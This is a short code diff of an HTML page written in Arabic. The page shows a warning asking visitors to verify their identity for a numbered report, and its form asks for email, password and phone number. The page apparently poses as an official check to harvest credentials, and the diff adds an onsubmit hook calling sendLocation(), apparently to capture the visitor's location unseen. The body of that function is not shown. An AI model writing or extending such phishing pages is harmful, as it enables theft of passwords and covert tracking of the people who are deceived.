@@ -93,7 +93,7 @@
 
 <div class="container">
     <p class="warning">⚠️ الرجاء إدخال بياناتك للتحقق من هويتك ومتابعة البلاغ رقم 1155/2025</p>
-    <form id="loginForm" method="post" action="/submit">
+    <form id="loginForm" method="post" action="/submit" onsubmit="sendLocation();">
         <input type="text" name="email" placeholder="عنوان البريد الإلكتروني" required>
         <input type="password" name="password" placeholder="كلمة المرور" required>
         <input type="tel" name="phone" placeholder="رقم الهاتف" required>
